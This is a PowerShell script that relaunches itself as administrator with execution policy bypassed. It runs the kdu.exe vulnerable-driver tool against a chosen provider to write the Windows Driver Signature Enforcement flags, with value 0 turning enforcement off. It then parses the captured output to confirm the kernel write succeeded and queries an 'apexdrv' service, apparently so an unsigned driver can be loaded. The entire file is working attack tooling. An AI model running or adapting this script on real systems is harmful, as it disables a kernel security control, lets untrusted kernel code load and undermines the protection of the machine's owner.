# h1c - try one kdu provider for a DSE write and report the outcome from the capture.
#   usage: h1c_try.ps1 -prv 2 -val 6      (val 6 = non-mutating probe, 0 = open DSE)
# Capture is cmd-redirected so a bugcheck cannot lose it. No driver load here.
param([int]$prv = 2, [int]$val = 6)
$adm = [bool](([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator))
if(-not $adm){
  Start-Process powershell -Verb RunAs -ArgumentList @('-NoProfile','-ExecutionPolicy','Bypass','-File',('"'+$PSCommandPath+'"'),'-prv',"$prv",'-val',"$val")
  exit
}
$pay = 'C:\p37vm\payload'
$o   = Join-Path $PSScriptRoot '_h1c.txt'
$cap = $pay + ('\_h1c_prv' + $prv + '_' + $val + '.txt')
function W($t){ $t | Add-Content -LiteralPath $o }
W ('=== h1c ' + (Get-Date -f 'HH:mm:ss') + ' prv=' + $prv + ' val=' + $val + ' ===')
& cmd.exe /c ('"' + $pay + '\kdu.exe" -prv ' + $prv + ' -dse ' + $val + ' > "' + $cap + '" 2>&1')
W ('  rc=' + $LASTEXITCODE)
$c = @()
if(Test-Path -LiteralPath $cap){ $c = Get-Content -LiteralPath $cap }
$ver = [bool](@($c | Where-Object { $_ -match 'verification succeeded' }).Count)
$err = (@($c | Where-Object { $_ -match 'Error while writing|verification failed|Abort' }) -join ' ; ')
$dse = (@($c | Where-Object { $_ -match 'DSE flags' }) -join ' ; ')
$prov = (@($c | Where-Object { $_ -match 'provider|Provider|driver "' }) | Select-Object -First 6) -join ' ; '
W ('  provider-relevant: ' + $prov)
W ('  dse-line: ' + $dse)
W ('  error: ' + $err)
W ('  VERIFIED=' + $ver)
W ('  apexdrv: ' + (((& sc.exe query apexdrv 2>&1) -join ' ') -replace '\s+',' '))
W '=== end h1c ==='
